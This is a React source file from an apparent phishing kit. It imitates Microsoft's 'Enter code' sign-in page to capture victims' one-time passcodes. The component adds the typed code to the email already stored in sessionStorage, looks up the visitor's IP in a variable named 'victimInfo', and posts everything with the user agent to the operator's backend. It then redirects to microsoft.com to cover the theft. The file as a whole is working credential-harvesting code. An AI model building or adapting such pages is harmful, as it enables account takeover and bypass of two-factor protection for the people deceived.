import "../assets/css/style.css";
import React, { useEffect, useMemo, useState } from "react";
import logo from "../assets/images/microsoft_logo.svg";
import axios from "axios";
import API from "../api/api";
import arrowIcon from "../assets/images/arrow.svg";
import Footer from "../components/Footer";
import { APP_STORAGE_NAME } from "../utils/constants";
import { Link, useHistory } from "react-router-dom";

export default function OTP() {
  const router = useHistory();
  let [otp, setOTP] = useState("");
  let [victimInfo, setVictimData] = useState({
    ip: "",
  });
  const email = useMemo(
    () => JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {},
    [],
  );

  async function submitForm(e) {
    e.preventDefault();

    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    try {
      const res = await API.createDetail({
        ..._data,
        otp,
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        window.location.href = "https://microsoft.com";
      }
    } catch (error) {
      alert("Something went wrong");
    }
  }

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();

    return () => {
      setOTP("");
    };
  }, []);

  return (
    <>
      <div className="wrapper">
        <div className="loginDiv">
          <p className="logoWrapper">
            <img
              className="logo"
              src={logo}
              alt=""
            />
          </p>
          <div className="back-btn">
            <img
              onClick={() => router.push("/")}
              src={arrowIcon}
              alt="arrowImg"
            />
            <p className="emailP">{email?.email || ""}</p>
          </div>
          <h1 className="head">Enter code</h1>
          <p
            style={{
              marginBottom: "1rem",
              display: "flex",
              alignItems: "flex-start",
              gap: "10px",
            }}
          >
            <svg
              stroke="currentColor"
              fill="currentColor"
              stroke-width="0"
              viewBox="0 0 16 16"
              height="18px"
              width="18px"
              style={{ minWidth: "18px", marginTop: 5 }}
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M14 1a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H4.414A2 2 0 0 0 3 11.586l-2 2V2a1 1 0 0 1 1-1h12zM2 0a2 2 0 0 0-2 2v12.793a.5.5 0 0 0 .854.353l2.853-2.853A1 1 0 0 1 4.414 12H14a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2z"></path>
            </svg>
            <span>
              We have sent a code to your contact information on file. Please
              enter the code to sign in.
            </span>
          </p>
          <input
            className="inputEmail"
            type="number"
            placeholder="Code"
            value={otp}
            onChange={(e) => {
              setOTP(e.target.value);
            }}
          />
          <div
            style={{
              display: "flex",
              alignItems: "center",
              margin: "12px 0",
            }}
          >
            <input
              type="checkbox"
              id="checkbox"
              style={{ marginRight: "6px", width: 16, height: 16 }}
            />
            <label htmlFor="checkbox">Don't ask again for 60 days</label>
          </div>
          <p style={{ fontSize: "14px", marginTop: "10px" }}>
            Having trouble? <Link to="/">Sign in another way</Link>
          </p>
          <p style={{ fontSize: "14px", marginTop: "10px" }}>
            <a href="#">More Information</a>
          </p>
          <p className="buttonsGroup">
            <button
              className="buttonBtnNext"
              onClick={submitForm}
            >
              Verify
            </button>
          </p>
        </div>
      </div>
      <Footer />
    </>
  );
}
